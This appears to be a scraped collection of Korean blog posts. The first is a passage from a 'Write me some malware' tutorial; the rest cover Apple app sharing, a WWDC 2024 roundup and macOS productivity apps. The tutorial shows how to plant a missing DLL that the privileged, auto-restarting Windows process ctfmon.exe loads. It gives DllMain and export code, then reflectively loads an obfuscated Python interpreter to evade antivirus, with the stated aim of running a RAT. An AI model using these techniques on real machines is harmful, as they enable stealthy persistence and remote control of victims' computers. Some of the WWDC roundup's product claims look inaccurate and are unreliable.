프로세스가 있습니다. 이 프로세스를 좋아하는 이유가 몇 가지 있어요.\n\n<div class=\"content-ad\"></div>\n\n\n![이미지](/assets/img/2024-06-19-Writemesomemalware_0.png)\n\n- 높은 권한에서 실행됩니다.\n- 충돌/중단 시 다시 시작하는 서비스가 있습니다.\n- 모든 Windows 컴퓨터에서 실행됩니다.\n\n\n<div class=\"content-ad\"></div>\n\n해당 프로세스 내에서 실행하고 싶긴 한데, 어떻게 해야할지가 문제야.\n\n\"virtual alloc — create remote thread\" 방법으로 내 자신을 주입할 수 있지만, 안티바이러스들이 이미 알고 있고 그 방법은 너무 2012년식이야. 더 나은 방법을 고민해봐야겠어.\n\n## ctfmon.exe에 로드하는 멋진 방법 찾기\n\nProcmon을 실행하고 ctfmon.exe를 다시 시작해서 무슨 일을 하는지 확인해봐.\n\n<div class=\"content-ad\"></div>\n\n\n<img src=\"/assets/img/2024-06-19-Writemesomemalware_1.png\" />\n\n음... ctfmon.exe이 LangDownloader.dll이라는 동적 라이브러리를 로드하려고 하는 것 같지만 찾을 수 없네요. 제 컴퓨터에 있는지 확인해보겠습니다.\n\n<img src=\"/assets/img/2024-06-19-Writemesomemalware_2.png\" />\n\nLangDownloader.dll이 없습니다... 하나 만들어 시스템32에 넣어 ctfmon.exe를 다시 시작해보겠습니다.\n\n\n<div class=\"content-ad\"></div>\n\n```js\nBOOL APIENTRY DllMain(HMODULE hModule,\n    DWORD  ul_reason_for_call,\n    LPVOID lpReserved\n)\n{\n    switch (ul_reason_for_call)\n    {\n\n    case DLL_PROCESS_ATTACH:\n        {\n        MessageBoxA(0, std::to_string(GetCurrentProcessId()).c_str(), 0, 0);\n        break;\n        }\n    case DLL_THREAD_ATTACH:\n    case DLL_THREAD_DETACH:\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}\n```\n\n메시지 상자를 표시하지만 ctfmon.exe가 종료됩니다. 무언가 잘못하고 있는 것 같아요 :(\n\nLangDownloader.dll이 어떻게 로드되는지 자세히 파악하여 더 나은 모방을 하고 충돌을 방지하고 싶어요. ctfmon.exe를 좀 더 자세히 살펴보는 것이 가장 좋은 방법인 것 같아요.\n\n![이미지](/assets/img/2024-06-19-Writemesomemalware_3.png)\n\n\n<div class=\"content-ad\"></div>\n\n이 static imports만 있는 것을 볼 수 있습니다. LangDownloader.dll은 여기 없는데요... 어디서 불러오는 걸까요?\n\nProcmon으로 돌아가보면 무언가를 발견할 수도 있을 거에요\n\n![image](/assets/img/2024-06-19-Writemesomemalware_4.png)\n\n여기 보세요. InputLocaleManager.dll을 불러오고 있네요. 이 파일을 조사해봅시다.\n\n<div class=\"content-ad\"></div>\n\n해당 문자열을 찾았습니다!\n\n![image](/assets/img/2024-06-19-Writemesomemalware_5.png)\n\n여기서 잘 로드되고 있네요. 이제 뭘 할까요?\n\n![image](/assets/img/2024-06-19-Writemesomemalware_6.png)\n\n<div class=\"content-ad\"></div>\n\n한번 확대해볼까요? 저희에게 pdb 파일이 있어요 (:\n\n![image 1](/assets/img/2024-06-19-Writemesomemalware_7.png)\n\n![image 2](/assets/img/2024-06-19-Writemesomemalware_8.png)\n\n이 코드를 한 번 분석해 봐요.\n\n<div class=\"content-ad\"></div>\n\n```js\n• LangDownloader.dll을로드하려고 시도합니다.\n• 실패하는 경우\n  - “종료”로 계속 진행합니다.\n• 성공하는 경우\n  - LangDownloaderCreate의 주소를 가져오려고 시도합니다.\n  - 실패하는 경우\n     프로세스 종료\n  - 성공하는 경우\n     매개변수와 함께 LangDownloaderCreate를 호출합니다\n```\n\n지금까지 잘 됐어요. 이것은 왜 ctfmon.exe가 실행할 LangDownloader.dll이라는 임의의 .dll을 제공했을 때 충돌했는지를 설명합니다.\n\n<img src=\"/assets/img/2024-06-19-Writemesomemalware_9.png\" />\n\n우리는 0보다 작고 0x800700E와 다른 숫자를 반환하면 우리는 그냥 계속 진행할 것임을 볼 수 있습니다... 내가 신경 쓰지 않으니까 무한 대기를 해봅시다.\n\n\n<div class=\"content-ad\"></div>\n\n```js\nextern \"C\" __declspec(dllexport) int LangDownloaderCreate(int a, int b)\n{\n    // 영원히 기다려요\n    HANDLE never_set = CreateEventA(NULL, TRUE, FALSE, NULL);\n    WaitForSingleObject(never_set, INFINITE);\n\n    return -1;\n}\n```\n\n알겠어요!\n\n![이미지](/assets/img/2024-06-19-Writemesomemalware_10.png)\n\n이제 실행 중이니까... 뭘 하고 싶어요?\n\n<div class=\"content-ad\"></div>\n\n# 무엇을 실행할까요:\n\n제 .dll 내부에 인터프리터를 실행하고 싶어요... 파이썬이 어떻게 하는지 살펴봐요\n\n배운 바에 의하면, 파이썬은 python`버전`.dll을 사용해서 모든 파이썬 작업을 처리해요\n\n이 .dll을 멋지게 C++ 인터페이스로 감싸봐요\n\n<div class=\"content-ad\"></div>\n\n```js\nclass PythonInterpreter\n{\npublic:\n    explicit PythonInterpreter();\n    ~PythonInterpreter();\n\n    NO_DISCARD void* run_line(const std::string& line);\n\n    // Deleted Functions\n    PythonInterpreter(const PythonInterpreter& other) = delete;\n    PythonInterpreter(PythonInterpreter&& other) = delete;\n    PythonInterpreter& operator=(const PythonInterpreter& other) = delete;\n    PythonInterpreter& operator=(PythonInterpreter&& other) = delete;\n\nprivate:\n    using PyObject = int;\n\n    using PyInitializeType = void (*)();\n    using PyFinalizeType = void (*)();\n    using PyRunSimpleStringType = PyObject * (*)(const char* str);\n\n    // Members\n    DynamicLibrary m_python_interpreter_library;\n    PyInitializeType m_initialize;\n    PyFinalizeType m_finalize;\n    PyRunSimpleStringType m_run_simple_string;\n};\n\nPythonInterpreter::PythonInterpreter() :\n    m_python_interpreter_library(WindowsResource::get_resource(GetModuleHandleA(OBFUSCATE(\"LangDownloader.dll\")),\n                                                               IDR_BINARY1,\n                                                               OBFUSCATE(\"Binary\"))),\n    m_initialize(static_cast<PyInitializeType>(m_python_interpreter_library.get_function(OBFUSCATE(\"Py_Initialize\")))),\n    m_finalize(static_cast<PyFinalizeType>(m_python_interpreter_library.get_function(OBFUSCATE(\"Py_Finalize\")))),\n    m_run_simple_string(static_cast<PyRunSimpleStringType>(m_python_interpreter_library.get_function(OBFUSCATE(\"PyRun_SimpleString\"))))\n{\n    m_initialize();\n}\n```\n\n이제 적절한 파이썬 인터프리터가 준비되어 있으므로, LangDownlder.dll에 통합하여 반사적으로 로드할 수 있습니다.\n\nDynamicLibrary 클래스를 만들어야 합니다.\n\n```js\nclass DynamicLibrary\n{\npublic:\n    explicit DynamicLibrary(ByteSpan library_binary);\n    ~DynamicLibrary();\n\n    NO_DISCARD void* get_function(const std::string& function_name);\n\n    // Deleted Functions\n    DynamicLibrary(const DynamicLibrary& other) = delete;\n    DynamicLibrary(DynamicLibrary&& other) = delete;\n    DynamicLibrary& operator=(const DynamicLibrary& other) = delete;\n    DynamicLibrary& operator=(DynamicLibrary&& other) = delete;\n\nprivate:\n    NO_DISCARD static HMEMORYMODULE load_library(ByteSpan library_binary);\n\n    // Members\n    HMEMORYMODULE m_library_base;\n};\n```\n\n<div class=\"content-ad\"></div>\n\n이제 ctfmon.exe 내부에 파이썬 인터프리터가 있습니다!\n\n![이미지](/assets/img/2024-06-19-Writemesomemalware_11.png)\n\n정말 멋지죠? \n\n이제 남은 일은 파이썬으로 RAT을 작성하는 것뿐입니다.\n\n<div class=\"content-ad\"></div>\n\n미안해요! 전손을 올립니다(:\n\n![Image](/assets/img/2024-06-19-Writemesomemalware_12.png)","ogImage":{"url":"/assets/img/2024-06-19-Writemesomemalware_0.png"},"coverImage":"/assets/img/2024-06-19-Writemesomemalware_0.png","tag":["Tech"],"readingTime":6},{"title":"애플이 왜 그들의 생산성 앱들에게 공유를 잘하게 가르키지 못할까","description":"","date":"2024-06-19 01:13","slug":"2024-06-19-WhyCantAppleTeachitsProductivityAppstoShareNicely","content":"\n\n![img](/assets/img/2024-06-19-WhyCantAppleTeachitsProductivityAppstoShareNicely_0.png)\n\n애플의 일반 서비스 앱을 좋아하고 보통은 타사 솔루션보다 더 선호합니다. 통합성과 일관된 작동 덕분에 그렇죠. 특히 매일 사용하는 생산성 앱인 캘린더, 노트, 그리고 알림을 정말 감사하게 사용 중이에요.\n\n애플은 최근에 이러한 앱에 기능을 많이 추가했지만, 여전히 원하는 상호 운용성이 부족하죠.\n\n몇 가지 예시를 살펴봅시다.\n\n<div class=\"content-ad\"></div>\n\n## 노트\n\n이 앱은 모든 기능이 갖춰진 진정한 생산성 앱입니다. 텍스트를 다양한 방법으로 서식 지정하고, 테이블, 이미지, 체크리스트, 첨부 파일, 태그, 스마트 폴더, 잠긴 노트, 다른 사람과 공유 및 더 많은 기능을 포함할 수 있습니다.\n\n하지만, 특정 날짜와 시간에 특정 노트에 대한 알림을 받거나, 위치에 도착했을 때나 누군가에게 메시지를 보낼 때 알림을 받고 싶을 때는 어떻게 해야 할까요? 이러한 기능은 Notes에 누락되어 있습니다. 그리고 노트를 캘린더로 드래그할 수 없으며, 공유 시트를 사용하여 캘린더와 노트를 공유할 수도 없습니다.\n\n## 노트를 리마인더로 캘린더로\n\n<div class=\"content-ad\"></div>\n\nNotes 앱에는 실제로 누락된 기능이지만 Reminders 앱에서 주요하게 처리됩니다. 노트에 알림을 추가하는 방법은 해당 노트를 Reminders로 공유하는 것입니다.\n\n원하는 노트를 선택한 후 공유를 탭하고 공유 시트에서 Reminders를 선택하세요. 약간 혼란스러운 점은 이후에 이메일 주소를 입력하라는 안내가 나온다는 것입니다. 이 기능은 다른 사람과 협업하기 위해서 생성된 것으로 보입니다. 그러나, 당신만의 이메일 주소를 사용하여 공유하면 노트가 Reminders로 공유됩니다.\n\n그 후, 새로운 링크된 리마인더에 원하는 알림 매개 변수를 추가하세요. 아래는 예시입니다. 원래 노트로 편리하게 연결된 링크를 주목하세요.\n\n<div class=\"content-ad\"></div>\n\n조금 색다른 방식을 사용해서 협업 기능을 해킹했지만, 그렇다고 해서 문제 없이 작동합니다. 이렇게 우회 방법으로 모든 알림 요구를 충족시킬 수 있어서 불만을 제기하기는 좀 과한 것 같아요.\n\n자, 그러면 이번에는 어떻게 하면 알림을 캘린더에 넣어서 놓고 놓칠 일이 없도록 할까요, 만약 알림을 놓치게 되더라도요.\n\n맥을 사용하시는 분들은 알림을 원하는 날짜에 캘린더로 끌어다 놓기만 하면 됩니다. 그 후에 날짜와 시간을 조정하거나 종일 행사로 식별하고 추가적인 알림을 설정하거나 초대할 사람들을 추가할 수 있어요.\n\n하지만, 이번에는 알림이나 노트로 돌아갈 링크가 없고, 원본 알림을 변경하면 캘린더 이벤트를 삭제해서 다시 알림을 캘린더로 끌어와야 합니다. 분명히 일을 좀 해결해야 할 부분이 있고, 이 부분은 개선이 필요한 영역입니다.\n\n<div class=\"content-ad\"></div>\n\n아이폰은 어떠신가요? 리마인더에는 공유 시트가 없고, 텍스트를 선택하고 공유를 시도해도 캘린더가 작동하지 않아요.\n\n리마인더 앱에서 사용자가 캘린더에 리마인더를 표시할지 여부를 결정하도록 하는 건 어떨까요? 그렇게 하면 단독 이벤트가 아닌 링크로 처리되어, 리마인더 내에서 변경 사항이 자동으로 캘린더에 업데이트될 거예요.\n\n## 캘린더\n\n캘린더 이벤트를 메모와 공유하는 것은 정말 쉬워요, 적어도 데스크톱에서는요. MacOS에서는 단순히 캘린더에서 원하는 노트로 이벤트를 끌어다 놓기만 하면 돼요. 리마인더의 노트처럼 편리한 링크가 제공돼요. 링크를 더블 클릭하여 캘린더 이벤트를 열 수 있어요.\n\n<div class=\"content-ad\"></div>\n\n\n![Image](/assets/img/2024-06-19-WhyCantAppleTeachitsProductivityAppstoShareNicely_2.png)\n\n이것은 정말 좋아요! 그러나 캘린더 이벤트를 이동하면 노트에 업데이트되지 않고 원래 날짜를 계속 표시할 것이라는 점에 유의하세요. 그리고 다시 한 번 iOS의 캘린더에는 공유 시트가 없습니다. 이것도 정리할 필요가 있어 보입니다.\n\n자, 그럼 Reminders와 그 일정을 공유해보겠어요. 아니요, 드래그는 실패할 것이고 캘린더 이벤트를 위한 공유 시트가 없습니다. 이것 또한 일관성이 없고 개선할 여지가 있습니다.\n\n## Reminders\n\n\n<div class=\"content-ad\"></div>\n\n이미 달력에 리마인더를 공유하는 방법을 설명했지만, 메모에 리마인더를 공유하는 방법은 어떨까요?\n\n내가 제안할 수 있는 최선의 방법은 리마인더를 메모로 끌어오는 것입니다. 이 방법은 동작하지만, 되돌아갈 수 있는 링크도 없고, 할 일의 텍스트 및 날짜(있는 경우)만 메모로 끌어오게 됩니다. 따라서 \"커피 머신의 이물질을 제거하라\"는 리마인더에 일부 지시 사항을 제공하고 싶다면, 해당 지시 사항으로 시작하는 메모를 작성한 다음 해당 메모를 리마인더와 공유하여 필요한 알림을 제공할 수 있습니다. 그리고 예약된 시간에는 원본 메모로 되돌아가는 링크를 사용하여 지시 사항을 볼 수 있게 됩니다.\n\n다시 한 번, 내가 언급한 일부 제한 사항을 피할 수 있는 방법이 있지만, 애플이 자사 응용 프로그램끼리 잘 동작하도록 가르쳐준다면 훨씬 간단해질 것입니다.\n\n다음은 몇 가지 제안 사항입니다.\n\n<div class=\"content-ad\"></div>\n\n- MacOS, iPadOS 및 iOS에서 캘린더, 노트 및 알림을 위한 공유 시트에 세 앱을 모두 추가하세요.\n- MacOS에서 모든 캘린더 이벤트, 노트 또는 알림을 세 응용 프로그램 중 하나로 끌어다 놓을 수 있도록 허용하고, 원본 응용 프로그램으로 되돌아가는 링크를 제공하세요.\n- 캘린더에 알림을 표시하는 옵션을 제공하세요.\n\n이 간단한 변경 사항은 Apple 사용자들에게 전 세계적으로 더 나은 세상을 만들 수 있습니다.\n\n제가 놓친 부분이 있다면 댓글로 알려주시면 감사하겠습니다. 동의하신다면 간단한 박수 두 번으로 제 날을 밝혀주세요. 건강하세요, 다음 포스트에서 뵙겠습니다. J","ogImage":{"url":"/assets/img/2024-06-19-WhyCantAppleTeachitsProductivityAppstoShareNicely_0.png"},"coverImage":"/assets/img/2024-06-19-WhyCantAppleTeachitsProductivityAppstoShareNicely_0.png","tag":["Tech"],"readingTime":4},{"title":"2024 WWDC 최종 요약 애플이 공개한 모든 것","description":"","date":"2024-06-19 01:12","slug":"2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled","content":"\n\n애플의 WWDC 2024는 혁신적인 발표와 혁신적인 발전으로 기술 세계를 다시 한 번 들썩이게 만들었습니다. 하드웨어 업그레이드부터 소프트웨어 향상까지, 올해 개발자 컨퍼런스에서 발표된 모든 것을 종합적으로 살펴보세요.\n\n![이미지](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_0.png)\n\n# 🌟 iPad Pro M4를 만나보세요: 폭발적인 성능 재정의\n\n가장 빛나는 스타는 의심의 여지 없이 iPad Pro M4였습니다. 애플의 최신 iPad Pro는 혁신적인 M4 칩을 장착하여 이제껏 없었던 성능과 효율성을 약속합니다. 창작가이든 강력한 사용자이든, iPad Pro M4는 당신의 작업 흐름을 높일 수 있도록 디자인되었습니다. 화려한 디스플레이, 향상된 그래픽, 그리고 원활한 멀티태스킹 능력을 기대해보세요.\n\n<div class=\"content-ad\"></div>\n\n- M4 칩으로 번개 같은 빠른 성능\n- 향상된 선명도와 색상 정확도를 갖춘 ProMotion 디스플레이\n- 프로 수준의 사진 촬영 및 비디오 촬영을 위한 고급 카메라 시스템\n\n# 🚀 iOS 18: 모바일 경험의 새로운 시작\n\n애플의 새로운 iOS 18이 출시되었습니다. 이것은 iPhone 사용 방식을 변화시키는 다양한 새로운 기능을 제공합니다. 개인정보 보호를 중점적으로 다루어 개선된 제어 및 투명성을 제공합니다. 이 업데이트에는 더 스마트한 멀티태스킹, 새로운 사용자 정의 옵션 및 더 직관적인 사용자 인터페이스도 포함되어 있습니다.\n\n![이미지](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_1.png)\n\n<div class=\"content-ad\"></div>\n\n- 개인정보 보호 설정이 개선되었어요\n\n![이미지](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_2.png)\n\n- Siri 기능이 향상되었어요\n\n![이미지](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_3.png)\n\n<div class=\"content-ad\"></div>\n\n- 새로운 위젯 및 사용자 정의 기능\n\n![이미지](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_4.png)\n\n# 💻 macOS 15: 맥 경험 높이기\n\n최신 macOS 15 업데이트는 강력한 새로운 도구와 모든 Apple 기기에서 완벽한 경험을 소개합니다. 다듬어진 미학과 개선된 통합으로 macOS 15는 맥이 디지털 생활의 중심에 남아있도록 보장합니다.\n\n<div class=\"content-ad\"></div>\n\n\n![Image 1](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_5.png)\n\n- Universal Control for effortless cross-device use\n\n![Image 2](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_6.png)\n\n- Redesigned Safari with new privacy features\n\n\n<div class=\"content-ad\"></div>\n\n\n![Enhanced productivity tools for professionals](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_7.png)\n\n![⌚ WatchOS 11: Your Ultimate Health Companion](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_8.png)\n\n\n<div class=\"content-ad\"></div>\n\nWatchOS 11는 애플 워치 경험을 더욱 발전시킬 예정입니다. 새로운 건강 추적 기능, 더 많은 운동 옵션, 그리고 신선한 인터페이스로, 건강을 유지하고 연결되는 것이 이제 더 쉬워졌어요.\n\n![이미지1](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_9.png)\n\n- 고급 건강 지표와 수면 추적\n\n![이미지2](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_10.png)\n\n<div class=\"content-ad\"></div>\n\n- 새로운 운동 모드와 피트니스 챌린지\n\n![이미지](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_11.png)\n\n- 새로 디자인된 워치 페이스와 합성기호\n\n# 💼 새로운 맥북 에어와 맥북 프로: 강력함과 휴대성의 만남\n\n<div class=\"content-ad\"></div>\n\n맥북 에어와 맥북 프로의 새로운 모델은 전례없는 파워와 효율을 제공하는 M4 칩을 탑재했습니다. 멋진 레티나 디스플레이, 긴 배터리 수명 및 최고 수준의 성능으로, 학생부터 프로페셔널까지 누구에게나 완벽한 노트북입니다.\n\n- 우수한 성능을 위한 M4 칩\n\n\n<div class=\"content-ad\"></div>\n\n- 오랜 배터리 수명\n\n![image1](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_14.png)\n\n- 세련된 가벼운 디자인\n\n![image2](/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_15.png)\n\n<div class=\"content-ad\"></div>\n\n# 🌐 증강 현실 및 가상 현실 혁신\n\n애플은 증강 현실(AR) 및 가상 현실(VR) 분야에서 지속적으로 혁신하고 있습니다. 2024 WWDC에서 소개된 새로운 도구 및 프레임워크는 개발자들이 전에 없던 만족스러운 경험을 창조할 수 있도록 도와줄 것입니다.\n\n- 개발자를 위한 고급 ARKit 도구\n- 게임 및 교육용 새로운 VR 경험\n- AR/VR 애플리케이션용 향상된 하드웨어 지원\n\n# 🍻 읽어 주셔서 감사합니다, 떠나시기 전에:\n\n<div class=\"content-ad\"></div>\n\nApple의 WWDC 2024는 개발자들에게 흥미로운 소식을 가져왔어요. 특히 Swift 및 SwiftUI의 최신 업데이트에 대한 소식이였죠. 이러한 개선 사항들은 코딩을 더 효율적이고 직관적이며 강력하게 만들기 위해 설계되었어요. 이에 대한 자세한 내용은 다음 기사에서 다룰 예정이에요.\n\n- 작성자에게 박수를 보내고 팔로우해주세요! 👏\n- Linkedin | GitHub에서 저를 팔로우하세요\n\n![이미지](https://miro.medium.com/v2/resize:fit:1400/0*kujG1SCrgJLl54ok.gif)","ogImage":{"url":"/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_0.png"},"coverImage":"/assets/img/2024-06-19-TheUltimateWWDC2024RoundupEverythingAppleUnveiled_0.png","tag":["Tech"],"readingTime":4},{"title":"당신을 생산성 천재로 변신시킬 12가지 탁월한 macOS 앱","description":"","date":"2024-06-19 01:07","slug":"2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius","content":"\n\n\n![](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_0.png)\n\n맥 macOS는 피자 속 반죽처럼 멋지지 않아요.\n\n단조로운 빵을 맛있게 만드는 건 야채 조각, 치즈, 토핑, 후추 등입니다. 마찬가지로 macOS도 평범한데, 일을 즐겁게 만드는 건 애플리케이션들이에요.\n\n아직 macOS의 기본 기능에 의존하고 있다면, 시간과 정신적 에너지, 생산성을 낭비하고 있습니다.\n\n\n<div class=\"content-ad\"></div>\n\n이 글에는 macOS 기반에 올릴 앱들이 12가지 포함되어 있어요. 저는 실제로 이 중 몇 가지를 매일 사용하고 있어요 - 그래서 확실해요.\n\n## 이 기사에 포함된 앱들\n\nAI 앱 🤖\n1 — superwhisper: 음성을 텍스트로 변환하는 AI 사용\n2 — BoltAI: AI를 활용하여 글쓰기, 코딩, 학습\nX — Ready to Send: 초안 이메일 답장 생성\n개발 앱 🧑‍💻\n3 — TeaCode: 확장자로 코딩 속도 향상\n4 — Core Shell: 완전한 기능의 SSH 터미널\n백그라운드 앱\n5 — Moment: 카운트다운 이벤트 생성\n6 — Noizio: 포커스를 위해 앰비언트 사운드 켜기\n파일 관리자 📁\n7 — Commander One: 이중 창 파일 관리자\n8 — Forklift: 서버 간 파일 관리\n9 — Trickster: 최근 파일 빠르게 접근\n10 — FilePane: 파일 관리자로 시간 절약\n수학 앱 🧮\n11 — Euclid: 엑셀 수식으로 계산하기\n12 — PocketCAS: 고급 수학 방정식 풀기\n\n# #1. superwhisper\n\n<div class=\"content-ad\"></div>\n\n## ($8.49/월 또는 $249.99 영구 | Setapp에서 이용 가능)\n\nsuperwhisper는 놀라운 AI 모델인 Whisper 위에 더욱 놀라운 UI를 제공합니다.\n\n![이미지](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_1.png)\n\n그런데 Whisper는 무엇일까요?\n이는 웹에서 수집한 680,000시간의 다국어 데이터로 훈련된 OpenAI의 자동 음성 인식 모델입니다.\n\n<div class=\"content-ad\"></div>\n\n테이블 태그를 Markdown 형식으로 변경하면 됩니다.\n\n<div class=\"content-ad\"></div>\n\n슈퍼위스퍼를 설치하면 모델의 다섯 가지 변형 중 하나를 선택하라는 메시지가 표시됩니다: Fast, Nano, Standard, Pro, Ultra — (정확도와 크기를 기준으로 오름차순, 속도를 기준으로 내림차순). 컴퓨팅 성능과 인내심이 충분하다면 Ultra를 추천해요.\n\n그리고요,\n\n- 앱에는 \"회의 모드\"가 있어 시스템 및 마이크 오디오를 듣고 회의 내용을 실시간으로 변환할 수 있어요.\n- Whisper가 마음에 들지 않는다면 Anthropic, Groq 또는 Ollama로 전환할 수 있어요.\n- 앱은 100여 개 언어에서 영어로 음성을 번역할 수 있어요.\n- 그리고, 고유한 이름, 비속어, 약어를 등록하면 앱이 고려해 줄 거예요.\n\n## 2. BoltAI\n\n<div class=\"content-ad\"></div>\n\n## (시작 가격 $22 | Setapp에서 이용 가능)\n\nGPT-4o를 $0으로 이용하는 방법을 아시나요?\nSetapp에서 BoltAI를 이용하면 됩니다 (이것은 정보 전달 목적으로 작성되었으며, Setapp을 사용하도록 설득하는 것이 아닙니다).\n\n저는 Setapp 가족 요금제를 사용하고 매달 50개의 AI 크레딧을 받습니다.\n\n```js\n50 크레딧은 다음과 같은 의미입니다:\n• GPT-3.5 Turbo로 2000개의 메시지\n• GPT-4 Turbo로 100개의 메시지\n• Whisper를 이용하여 250분\n```\n\n<div class=\"content-ad\"></div>\n\n하지만 먼저 'BoltAI'가 뭔가요?\n이것은 여러 AI 모델에 대한 단일 UI입니다.\n\n![image](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_2.png)\n\n직업으로는 개발자이고 취미로는 블로거인 저는 작품에 마무리 손질을 하기 위해 AI를 사용해요. 똑똑하게, 하나의 AI 모델에만 의존하지 않아요. 왜냐하면 각 모델마다 장단점이 있거든요.\n\n그리고 AI 모델 사이를 전환하기 위해 브라우저 탭을 바꾸는 걸 싫어해요.\n\n<div class=\"content-ad\"></div>\n\n인기있는 모델인 GPT, Gemini, Claude, Stable Diffusion 및 Mistral을 위한 단일 UI가 필요했습니다. 그리고 그때 BoltAI를 발견했습니다.\n\n가장 좋은 점은 이 앱이 수십 가지의 다음과 같은 기능을 제공한다는 것입니다.\n\n```js\n• 다음과 같은 프롬프트:\n내 글을 간단히 작성, 유머 감각으로 쓰기, 반대 주장/반론 쓰기.\n• 다음과 같은 어시스턴트:\n코미디언, 건강/라이프 코치, 금융 자문가, 소프트웨어 개발자.\n```\n\nBoltAI는 UI 없이도 동일하게 효과적입니다.\n\n<div class=\"content-ad\"></div>\n\n그냥 gpt: `prompt`를 입력하고 ⇧⌘⏎를 눌러 인공지능을 인라인으로 사용하세요. 또는 /ask_`AI 역할` `프롬프트`를 사용하여 역할을 호출하세요. 설명서, 이메일, 메모 또는 입력할 곳이면 어디에서든 이렇게 해보세요.\n\n## #X. 발송 준비 완료\n\n### (월 $5부터 | Setapp에서 이용 가능)\n\n\"왜 #X를 넣었을까요? 이것은 앱이 아닌 내가 사용하는 Gmail 확장 프로그램입니다. 이 기사의 보너스로 생각해주세요.\"\n\n<div class=\"content-ad\"></div>\n\n내가 말했듯이, 나는 9시부터 5시까지는 개발자이고 5시부터 9시까지는 블로거이다. 둘 다 성공을 위해 \"네트워킹\"이 필요하다고.\n\n그것은 이메일로 이루어진다. 그래서 나는 이메일에 대한 응담이 중요하고 적시에 회신하며 적극적으로 후속 조치를 취하는 것이 중요하다.\n\n하지만 여기서 가장 어려운 부분은 → 이미 지친 두뇌를 다시 가동시켜야 하고 정식으로 설득력 있는 이메일/회신을 작성해야 하는 것이다. 특히 PM시간에 긴급 이메일이 온 경우에는 더욱 어렵다.\n\n어쨌든, 그것은 슬픈 옛 이야기야.\n\n<div class=\"content-ad\"></div>\n\n최근에 이 신의 보낸 이메일 확장 프로그램 — Ready to Send — 를 설치하면서 내 삶이 훨씬 쉬워졌어요. 이 확장 프로그램은 내 수신 이메일에 자동으로 초안 답장을 생성해줘요.\n\n![이미지](/assets/img/2024-06-19-The12exceptionalmacOSappsthatwillturnyouintoaProductivityGenius_3.png)\n\n가장 좋은 점은 최신 이메일뿐만 아니라 전체 대화를 고려한다는 것이에요. 이렇게 하면 더 나은 맥락을 파악할 수 있어요.\n\n또한\n\n| 좋은 점  | 추가 기능 |\n|----------|------------|\n| 전체 대화 고려 | 좋은 맥락 제공 |\n| 자동 초안 | 편리함 제공 |\n\n<div class=\"content-ad\"></div>\n\n- 내 스타일, 비즈니스 및 초안 길이에 맞는 AI 프롬프트로 사용자 정의하세요.\n- 자동으로 회신할 이메일 유형을 선택하세요 (AI 크레딧이 회신하지 않는 뉴스레터에 소비되지 않도록).\n\n# #3. TeaCode\n\n## ($24.99 | Setapp에서 이용 가능)\n\n하루에 8시간 동안 코딩을 합니다. 종종 그것은 지치게 합니다.\n\n<div class=\"content-ad\"></div>\n\n친구야, 내 눈을 돌봐주거나 코딩을 더 쉽게 만들어 주거나 상사를 몰디브로 1년간 휴가 보내게 해주는 거라면, 나는 심지어 $9650을 들이겠어.\n\n그래, 알아. 후자는 불가능해. 그렇지만 그게 가능하려면 부사장의 연봉인 $96,000을 뇌물로 줄 돈이 있어야 해. 하지만 오늘은 그 돈이 없어.\n\n그래서 나는 이렇게 해결책을 찾았어. $25짜리 TeaCode 앱이 참 좋더라. macOS의 텍스트 대체 기능의 코더 버전 같아. (예를 들어 omw이라고 입력하면 On my way!로 변경됨!)\n\n얘기해볼까? 스위프트를 입력할 때 두 때 사용법을 알아봐.\n\n<div class=\"content-ad\"></div>\n\n- 'bar'를 얻으려면\n\n```swift\nprivate func bar() {\n\n}\n```\n\n- 'foo'를 가지고 있을 때\n\n```swift\nguard let foo = foo else {\n    return\n}\n```\n\n<div class=\"content-ad\"></div>\n\n- _\"Hello World\" 메시지를 가져오려면\n\n```js\nNSLocalizedString(\"Hello World\", comment: \"Message\")\n```\n\n- HelloWorld를 vdel로 바꾸려면\n\n```js\nprotocol HelloWorldViewDelegate: class {\n}\n\nclass HelloWorldView: NSView {\n    weak var delegate: HelloWorldViewDelegate?\n\n    override init(frame frameRect: NSRect) {\n        super.init(frame: frameRect)\n    }\n\n    required init?(coder decoder: NSCoder) {\n        super.init(coder: decoder)\n    }\n}\n```\n\n<div class=\"content-ad\"></div>\n\n안녕하세요! 이렇게 보세요? 코드에 HelloWorld가 세 번 등장하는데, 한 번만 입력했어요 — TeaCode 덕분에 시간을 절약하고 있네요.\n\n만약 NikhilVemu 대신에 같은 코드를 사용하고 싶다면 vdel NikhilVemu 라고 입력하면 돼요.\n\n제일 좋은 점,\n\n- TeaCode는 80가지 이상의 기본 텍스트 확장 기능을 제공하며, 원한다면 더 만들 수 있어요.\n- 이 앱은 모든 macOS 네이티브 텍스트 편집기와 함께 작동하며, VS Code나 IntelliJ와 같은 편집기용 플러그인도 제공돼요.\n- ⌘+⇧+공백키를 사용하여 Spotlight와 비슷한 인터페이스에서 어떤 확장기능이든 빠르게 찾을 수 있어요.\n\n<div 